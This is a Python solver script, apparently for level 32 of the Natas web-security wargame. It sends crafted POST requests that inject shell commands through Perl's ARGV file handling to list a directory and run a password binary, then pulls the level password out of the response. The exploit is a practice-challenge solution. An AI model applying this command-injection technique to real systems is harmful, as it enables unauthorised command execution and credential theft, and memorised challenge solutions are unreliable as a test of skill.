import re
from .base_solver import NatasSolver

class Natas32Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # First check directory contents
            response = self.make_request(
                path="/index.pl?ls -la . | xargs echo |",
                method="POST",
                files=[('file', ('filename', 'anything'))],
                data={'file': 'ARGV'}
            )
            
            # Then execute getpassword binary
            response = self.make_request(
                path="/index.pl?./getpassword | xargs echo |",
                method="POST",
                files=[('file', ('filename', 'anything'))],
                data={'file': 'ARGV'}
            )
            
            # Extract password using regex
            match = re.findall(r'[0-9a-zA-Z]{32}', response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas32: {str(e)}")


